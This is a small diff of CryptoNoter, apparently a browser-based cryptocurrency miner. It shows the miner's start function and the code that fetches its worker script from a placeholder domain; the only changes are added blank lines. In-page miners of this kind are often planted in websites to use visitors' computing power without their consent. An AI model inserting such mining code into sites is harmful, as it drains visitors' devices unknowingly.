@@ -62,6 +62,7 @@
             sharesVerfied:0
         }
     };
+
     Miner.prototype.start = function (mode) {
         this._tab.mode = mode || CryptoNoter.IF_EXCLUSIVE_TAB;
         if (this._tab.interval) {
@@ -75,6 +76,7 @@
                 this._asmjsStatus = "loaded";
                 this._startNow()
             }.bind(this), xhr);
+
             xhr.open("get", "%CryptoNoter_domain%/worker.js", true);
             xhr.send()
         } else if (this._asmjsStatus === "unloaded") {
